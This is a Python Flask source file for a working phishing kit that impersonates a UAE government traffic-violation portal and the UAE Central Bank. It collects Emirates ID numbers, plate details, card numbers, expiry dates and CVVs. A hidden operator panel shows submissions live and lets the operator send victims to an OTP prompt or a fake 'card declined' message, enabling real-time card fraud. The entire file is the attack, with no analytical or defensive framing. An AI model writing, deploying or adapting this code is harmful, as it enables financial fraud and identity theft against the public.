import os
from flask import Flask, render_template_string, request, jsonify

app = Flask(__name__)

# قاعدة البيانات (التحكم المباشر)
db = {"logs": [], "status": "waiting"}

# الهيدر الحكومي الثابت
HEADER = '<div style="position:sticky; top:0; z-index:1000; background:white; border-bottom:1px solid #ddd; width:100%;"><img src="https://static.wixstatic.com/media/a9f3d9_06f1bacd5c6543efa20f319b06df8438~mv2.jpg" style="width:100%; display:block;"></div>'

# --- 1. الصفحة الرئيسية (الـ 8 صور) ---
HOME_HTML = f"""
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
    body, html {{ margin:0; padding:0; background:#f4f4f4; font-family: sans-serif; }}
    .page {{ max-width:650px; margin:0 auto; background:white; position:relative; box-shadow:0 0 20px rgba(0,0,0,0.1); }}
    img {{ width:100%; display:block; }}
    .btn-hidden {{ position:absolute; left:10%; width:80%; height:55px; background:transparent; border:none; cursor:pointer; z-index:10; }}
</style>
</head>
<body>
    {HEADER}
    <div class="page">
        <img src="https://static.wixstatic.com/media/a9f3d9_c1d337bf7a804573a004f115b6c69d23~mv2.jpg">
        <button class="btn-hidden" style="top:270px;" onclick="location.href='/search'"></button>
        <button class="btn-hidden" style="top:325px;" onclick="location.href='/search'"></button>
        <img src="https://static.wixstatic.com/media/a9f3d9_d8f02563f4e2475fa5e4fcc5b2daaaf5~mv2.jpg">
        <img src="https://static.wixstatic.com/media/a9f3d9_d0dcb4c088a84089afa337a46bc21bf7~mv2.jpg">
        <img src="https://static.wixstatic.com/media/a9f3d9_dc754b0143e14766a16919be2a1ee249~mv2.jpg">
        <img src="https://static.wixstatic.com/media/a9f3d9_0596c91fd65d49a9b3598f7d4ff5a811~mv2.jpg">
        <img src="https://static.wixstatic.com/media/a9f3d9_1347280275a14cada9eef8982ee5a375~mv2.jpg">
        <img src="https://static.wixstatic.com/media/a9f3d9_662e4c074fe94f80940882c18cd51a87~mv2.jpg">
    </div>
</body>
</html>
"""

# --- 2. صفحة الاستعلام (النسخة الكاملة بدون نقص) ---
SEARCH_HTML = f"""
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head><meta charset="UTF-8"><style>
    body {{ background:#f4f4f4; margin:0; font-family:sans-serif; }}
    .mega-card {{ background:white; width:95%; max-width:850px; margin:30px auto; border-radius:15px; border-top:10px solid #b0914f; box-shadow:0 10px 40px rgba(0,0,0,0.1); overflow:hidden; }}
    .form-p {{ padding:40px; }}
    label {{ display:block; margin-bottom:10px; font-weight:bold; font-size:17px; color:#444; }}
    select, input {{ width:100%; padding:16px; margin-bottom:20px; border:1px solid #ccc; border-radius:8px; font-size:16px; box-sizing:border-box; }}
    .grid-plate {{ display:grid; grid-template-columns: 1.2fr 0.8fr 2fr; gap:12px; }}
    .btn-go {{ background:#b0914f; color:white; width:100%; padding:20px; border:none; border-radius:8px; font-size:20px; font-weight:bold; cursor:pointer; }}
</style></head>
<body>
    {HEADER}
    <div class="mega-card">
        <div style="background:#b0914f; color:white; padding:25px; text-align:center; font-size:22px;">الاستعلام عن المخالفات المرورية</div>
        <form action="/checkout" method="GET" class="form-p">
            <label>إمارة مصدر اللوحة / Plate Source:</label>
            <select name="emirate">
                <option>أبوظبي / Abu Dhabi</option><option>دبي / Dubai</option><option>الشارقة / Sharjah</option>
                <option>عجمان / Ajman</option><option>أم القيوين / Umm Al Quwain</option>
                <option>رأس الخيمة / Ras Al Khaimah</option><option>الفجيرة / Fujairah</option>
            </select>
            <label>فئة ورمز اللوحة / Plate Details:</label>
            <div class="grid-plate">
                <select name="type">
                    <option>خصوصي</option><option>نقل عام</option><option>تجاري</option>
                    <option>دراجة</option><option>تصدير</option>
                </select>
                <input type="text" name="code" placeholder="الرمز">
                <input type="text" name="number" placeholder="رقم اللوحة">
            </div>
            <label>رقم الهوية الإماراتية / Emirates ID:</label>
            <input type="text" name="eid" placeholder="784-XXXX-XXXXXXX-X" required>
            <button type="submit" class="btn-go">بحث وتفصيل المخالفات</button>
        </form>
    </div>
</body>
</html>
"""

# --- 3. بوابة الدفع (تصميم فخم - طبق الأصل) ---
PAY_HTML = f"""
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
<style>
    body {{ background:#eaebed; margin:0; font-family: 'Segoe UI', Tahoma; }}
    .pay-card {{ max-width:500px; margin:40px auto; background:white; border-radius:12px; box-shadow:0 8px 30px rgba(0,0,0,0.1); overflow:hidden; border:1px solid #ddd; }}
    .pay-head {{ background:white; padding:20px; text-align:center; border-bottom:1px solid #eee; }}
    .pay-body {{ padding:30px; }}
    .info-box {{ background:#f8f9fa; border:1px dashed #b0914f; padding:15px; text-align:center; border-radius:8px; margin-bottom:25px; color:#2c3e50; }}
    label {{ display:block; margin-bottom:8px; font-size:14px; color:#666; }}
    input {{ width:100%; padding:15px; margin-bottom:20px; border:1px solid #ccc; border-radius:6px; font-size:16px; box-sizing:border-box; }}
    .btn-pay {{ background:#2c3e50; color:white; width:100%; padding:18px; border:none; border-radius:6px; font-size:18px; font-weight:bold; cursor:pointer; }}
    .trust-logos {{ text-align:center; padding:20px; border-top:1px solid #eee; background:#fafafa; }}
</style></head>
<body>
    {HEADER}
    <div class="pay-card">
        <div class="pay-head"><img src="https://upload.wikimedia.org/wikipedia/commons/0/03/Central_Bank_of_the_United_Arab_Emirates_logo.png" height="50"></div>
        <div class="pay-body">
            <div class="info-box">إجمالي المبلغ المستحق للدفع: <br><strong style="font-size:22px;">255.00 AED</strong></div>
            <form action="/submit-card" method="POST">
                <label>اسم حامل البطاقة / Cardholder Name</label>
                <input type="text" name="holder" placeholder="الاسم بالكامل" required>
                <label>رقم البطاقة / Card Number</label>
                <input type="text" id="cnum" name="card" placeholder="0000 0000 0000 0000" maxlength="19" required>
                <div style="display:flex; gap:10px;">
                    <div style="flex:1;"><label>تاريخ الانتهاء</label><input type="text" name="exp" placeholder="MM / YY"></div>
                    <div style="flex:1;"><label>رمز الأمان (CVV)</label><input type="text" name="cvv" placeholder="123"></div>
                </div>
                <button type="submit" class="btn-pay">دفع الآن / Pay Securely</button>
            </form>
        </div>
        <div class="trust-logos">
            <img src="https://img.icons8.com/color/48/visa.png" width="35">
            <img src="https://img.icons8.com/color/48/mastercard.png" width="35">
            <p style="font-size:10px; color:#999;">PCI-DSS Compliant & Secure Encryption</p>
        </div>
    </div>
    <script>
        document.getElementById('cnum').addEventListener('input', e => {{
            let v = e.target.value.replace(/\\s/g, '').replace(/(.{{4}})/g, '$1 ').trim();
            e.target.value = v;
        }});
    </script>
</body>
</html>
"""

# --- السيرفر ولوحة التحكم ---
@app.route('/')
def index(): return render_template_string(HOME_HTML)

@app.route('/search')
def search(): return render_template_string(SEARCH_HTML)

@app.route('/checkout')
def checkout(): return render_template_string(PAY_HTML)

@app.route('/h-admin')
def admin_p():
    return render_template_string("""
    <body style="background:#1a1a1a; color:white; font-family:sans-serif; padding:30px;">
        <h2>لوحة التحكم الحية 👮‍♂️</h2><div id="logs"></div>
        <script>
            function load() {
                fetch('/get-logs').then(r => r.json()).then(data => {
                    let h = '';
                    data.logs.forEach(l => {
                        h += `<div style="border:1px solid gold; padding:20px; margin-bottom:15px; background:#222;">
                            <p>${JSON.stringify(l)}</p>
                            <button onclick="act('go_otp')" style="background:green; color:white; padding:10px;">اطلب OTP</button>
                            <button onclick="act('error_card')" style="background:red; color:white; padding:10px;">رفض</button>
                        </div>`;
                    });
                    document.getElementById('logs').innerHTML = h;
                });
            }
            function act(s) { fetch('/set-status/' + s); }
            setInterval(load, 3000);
        </script>
    </body>""")

@app.route('/submit-card', methods=['POST'])
def sub():
    db['logs'].insert(0, request.form.to_dict())
    db['status'] = 'waiting'
    return render_template_string(WAIT_JS)

@app.route('/get-logs')
def get_logs(): return jsonify({"logs": db['logs']})

@app.route('/set-status/<s>')
def set_s(s): db['status'] = s; return "OK"

@app.route('/check-status')
def check_s(): return jsonify({"status": db['status']})

WAIT_JS = """
<script>
    setInterval(() => {
        fetch('/check-status').then(r => r.json()).then(d => {
            if(d.status === 'go_otp') location.href='/otp';
            if(d.status === 'error_card') { alert('البطاقة مرفوضة من البنك'); location.href='/checkout'; }
        });
    }, 3000);
</script>
<body style="text-align:center; padding-top:100px; font-family:sans-serif;">
    <div style="border:8px solid #f3f3f3; border-top:8px solid #b0914f; border-radius:50%; width:60px; height:60px; animation:spin 1s linear infinite; margin:auto;"></div>
    <h2>جاري التواصل مع المصرف المركزي...</h2>
    <style>@keyframes spin { 0% { transform:rotate(0deg); } 100% { transform:rotate(360deg); } }</style>
</body>
"""

@app.route('/otp')
def otp(): return "<body><div style='text-align:center; padding:50px;'><h2>أدخل رمز OTP</h2><form action='/submit-card' method='POST'><input name='otp' style='padding:15px;'><button>تأكيد</button></form></div></body>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
